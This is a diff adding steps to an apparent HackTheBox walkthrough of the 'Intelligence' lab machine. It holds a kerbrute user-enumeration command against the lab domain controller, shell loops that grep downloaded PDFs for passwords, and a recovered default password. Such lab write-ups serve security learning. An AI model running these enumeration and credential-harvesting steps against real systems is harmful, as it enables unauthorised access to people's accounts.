@@ -79,4 +79,44 @@ https://www.youtube.com/@noxlumens
 
 get-exiftool-creator.py
 
- 
+users-unique.txt
+
+```
+./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d intelligence.htb users-unique.txt
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8e75a58f-f599-47f4-bf34-2961a451979e)
+
+wget-pdf.py
+
+https://youtu.be/qPEOS0jESQQ?t=692
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7fa9f8de-80c7-422f-8a24-b0e464f2ede5)
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e4e4e305-63bb-4e6b-9887-e6990450a1b9)
+
+```
+for file in *.pdf; do pdftotext -q -f 1 -l 1 "$file" - | grep -C 8 -i "password"; done
+```
+
+```
+for file in *.pdf; do pdftotext $file; done
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a60faa4f-43be-4807-aee1-dfd355e64a17)
+
+```
+cat *.txt | grep -C 8 -i "password"
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/064ed249-aac4-4e4f-a52a-23ba7cb8f154)
+
+```
+New Account Guide
+Welcome to Intelligence Corp!
+Please login using your username and the default password of:
+NewIntelligenceCorpUser9876
+After logging in please change your password as soon as possible.
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/42ab4edf-6c22-4b70-bf28-d22f54c5d710)
